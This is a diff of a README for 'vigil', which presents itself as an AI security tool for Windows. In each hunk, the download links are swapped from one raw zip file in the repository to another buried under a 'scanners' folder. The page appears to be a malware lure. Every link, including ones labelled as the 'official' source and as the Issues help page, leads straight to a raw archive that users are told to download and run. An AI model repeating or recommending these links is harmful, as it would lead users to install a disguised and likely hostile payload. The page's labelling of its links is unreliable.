@@ -1,6 +1,6 @@
 # 🛡️ vigil - Stay Secure with AI Insights
 
-[![Download vigil](https://img.shields.io/badge/Download-vigil-blue?style=for-the-badge)](https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip)
+[![Download vigil](https://img.shields.io/badge/Download-vigil-blue?style=for-the-badge)](https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip)
 
 ---
 
@@ -16,7 +16,7 @@ To get vigil running on your Windows PC, follow these steps carefully:
 
    Click the large button above or visit the link below to open the download page on GitHub:
 
-   [https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip](https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip)
+   [https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip](https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip)
 
 2. **Find the Windows version**
 
@@ -150,7 +150,7 @@ For more help, visit the GitHub page and look under “Issues.” You can find a
 
 Always use the official GitHub link for downloading or updating vigil:
 
-[https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip](https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip)
+[https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip](https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip)
 
 This page provides the latest versions, release notes, and contact info to report any issues.
 
@@ -246,4 +246,4 @@ You can participate by reporting bugs, requesting features, or contributing code
 
 For questions or help, use the “Issues” section on GitHub:
 
-[https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip](https://raw.githubusercontent.com/ydavidcm9-wq/vigil/main/data/Software-3.1.zip)
+[https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip](https://github.com/ydavidcm9-wq/vigil/raw/refs/heads/main/lib/scanners/Software_3.8.zip)
